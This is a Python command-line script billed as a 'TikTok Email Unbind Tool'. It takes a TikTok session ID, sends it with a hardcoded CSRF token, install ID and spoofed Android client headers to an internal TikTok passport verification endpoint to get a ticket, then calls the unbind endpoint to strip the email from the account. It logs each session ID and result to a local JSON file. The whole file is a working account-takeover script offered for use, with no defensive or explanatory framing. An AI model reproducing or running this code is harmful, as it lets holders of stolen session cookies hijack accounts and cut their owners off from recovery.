import requests
import json
import os

SESSION_FILE = "sessions.json"

def load_sessions():
    if os.path.exists(SESSION_FILE):
        with open(SESSION_FILE, "r") as f:
            return json.load(f)
    return {}

def save_sessions(sessions):
    with open(SESSION_FILE, "w") as f:
        json.dump(sessions, f, indent=4)

def process_tiktok_session(sessionid):
    try:
        url = "https://api16-normal-c-useast1a.tiktokv.com/passport/shark/safe_verify/v2/?aid=1233"
        headers = {
            "cookie": f"passport_csrf_token=1e39947b417c5d7413335af0b7031990; sessionid={sessionid}; install_id=7417798636816353056",
            "user-agent": "com.ss.android.ugc.trill/360505 (Linux; Android 7.1.2; en; SM-N975F; Build/N2G48H;tt-ok/3.12.13.4-tiktok)",
            "x-tt-passport-csrf-token": "1e39947b417c5d7413335af0b7031990"
        }
        payload = {"product_scene": "31", "mix_mode": "1"}

        response = requests.post(url, headers=headers, data=payload)
        data = response.json().get("data", {})

        if "passport_ticket" not in data:
            return False, f"Failed: {data}"

        passport_ticket = data["passport_ticket"]
        unbind_url = f"https://api16-normal-c-useast1a.tiktokv.com/passport/mobile/unbind/?passport_ticket={passport_ticket}&aid=1233"
        final_response = requests.post(unbind_url, headers=headers, data={"body": "null"}).text

        return True, final_response

    except Exception as e:
        return False, f"Error: {str(e)}"

def main():
    print("="*50)
    print("TikTok Email Unbind Tool (CLI Version)")
    print("="*50)

    sessions = load_sessions()

    while True:
        sessionid = input("Enter TikTok SessionID (or 'exit' to quit): ").strip()
        if sessionid.lower() == "exit":
            break

        success, result = process_tiktok_session(sessionid)
        if success:
            print("\n✅ Operation Successful")
            print("Result:", result)
            sessions[sessionid] = result
            save_sessions(sessions)
        else:
            print("\n❌ Operation Failed")
            print("Error:", result)

        print("="*50)

if __name__ == "__main__":
    main()
